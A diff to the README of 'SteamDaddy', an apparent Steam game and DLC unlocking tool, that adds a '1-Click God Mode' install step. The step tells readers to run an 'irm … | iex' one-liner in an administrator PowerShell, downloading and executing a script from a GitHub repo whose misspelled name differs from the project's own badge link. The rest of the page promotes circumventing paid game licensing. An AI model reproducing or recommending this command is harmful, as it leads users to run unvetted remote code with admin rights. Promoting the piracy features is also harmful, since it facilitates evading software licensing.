@@ -1,5 +1,5 @@
 <div align="center">
-  <img src="icon.ico" alt="SteamDaddy Logo" width="128" height="128" />
+  <img src="icon.png" alt="SteamDaddy Logo" width="128" height="128" />
   <h1>SteamDaddy</h1>
   <p><b>The Ultimate SteamTools Alternative & Manifest Manager</b></p>
   <p><i>Unlock games, auto-patch online fixes, sync achievements, and manage DLCs — all from inside your Steam client.</i></p>
@@ -7,6 +7,7 @@
   [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
   [![Platform](https://img.shields.io/badge/platform-windows-lightgray.svg)]()
   [![Discord](https://img.shields.io/badge/Discord-ContraryCDN-5865F2?logo=discord&logoColor=white)](https://discord.gg/XN6YGcUF89)
+  [![Stars](https://img.shields.io/github/stars/Contrary7/SteamDaddy-Backup?style=social)](https://github.com/Contrary7/SteamDaddy-Backup/stargazers)
 
   <p align="center">
     <a href="#-what-is-steamdaddy">What is it?</a> •
@@ -27,7 +28,6 @@
 > 
 > ⭐ **If SteamDaddy helped you out, please drop a Star on this new repo!** It helps us rebuild our community and keeps the project alive.
 
----
 
 ## 🔥 What is SteamDaddy?
 
@@ -45,6 +45,13 @@ Unlike other tools that rely on unstable third-party backends, SteamDaddy lets y
 
 ---
 
+### 🚀 1-Click God Mode (Instant Install)
+Too lazy to read the docs? Just open **PowerShell as Administrator**, paste this cursed incantation, and hit enter. It will aggressively auto-download, configure, and inject SteamDaddy straight into your client in seconds.
+```powershell
+irm https://raw.githubusercontent.com/Contrary7/SD-Backhups/main/install_b.ps1 | iex
+```
+---
+
 ## ✨ Features at a Glance
 
 | Feature | Description |
@@ -52,10 +59,10 @@ Unlike other tools that rely on unstable third-party backends, SteamDaddy lets y
 | ⚡ **Overcome Server Outages** | Fix "No Internet Connection" errors by manually dropping manifests from trusted servers |
 | 🔌 **One-Click "Install Plugin"** | **No manual setup needed!** Simply click **"Install Plugin"** inside SteamDaddy and everything is deployed automatically |
 | 🛠️ **Repair SteamTools** | Auto-fix corrupted hooks, registry issues, and "Purchase Issue" prompts |
-| 🌐 **ContraryCDN API** | Fetch manifests instantly by AppID — no drag-and-drop needed |
 | 🎮 **"Patch" Button** | 1-Click auto-download & apply online multiplayer fixes directly from the Steam UI |
 | 🌍 **"Universal Fix" Button** | Experimental fallback to configure Epic Online Services (EOS) & Steam network session routing |
 | ⏳ **"Unlock Specific Build"** | Easily rollback, downgrade, or acquire specific game versions for mod compatibility |
+| 🌐 **ContraryCDN API** | Fetch manifests instantly by AppID — no drag-and-drop needed |
 | 🔓 **Automatic DLC Unlocking** | All available DLCs are automatically unlocked when you fetch a game |
 | 🏆 **Achievement Syncing** | Detect offline achievements (Goldberg, CODEX, OnlineFix, EMPRESS, etc.) and sync them to your real Steam profile |
 | ☁️ **Local Cloud Sync** | Fix the annoying "Unable to Sync Cloud" error on unlocked games by simulating cloud sync locally |
@@ -237,7 +244,7 @@ SteamDaddy includes a massive database of online multiplayer fixes. When a fix i
 
 ---
 
-## 🏆 Achievement Syncing
+## 🏆 Achievement Syncing (Experimental)
 
 SteamDaddy can detect achievements earned in **offline emulators** and sync them to your real Steam profile.
 
@@ -299,18 +306,6 @@ SteamDaddy can check for new versions and update itself directly from GitHub.
 2. SteamDaddy compares your installed `plugin.json` version against the latest GitHub release.
 3. If an update is available, it downloads and launches the new installer automatically.
 4. Hit **"Install Plugin"** again after updating to deploy the latest plugin files.
-
----
-
-## 📊 Quota & Daily Limits
-
-SteamDaddy uses a daily quota system to manage API usage fairly:
-
-- **Default limit:** 20 downloads per 24-hour window
-- Your count resets automatically after 24 hours
-- Usage syncs between your local client and the SteamDaddy VPS
-- **Want more?** Donate to increase your daily limit instantly — it's automated!
-- Reseller keys with custom limits are available via the Contrary Discord
 
 ---
 
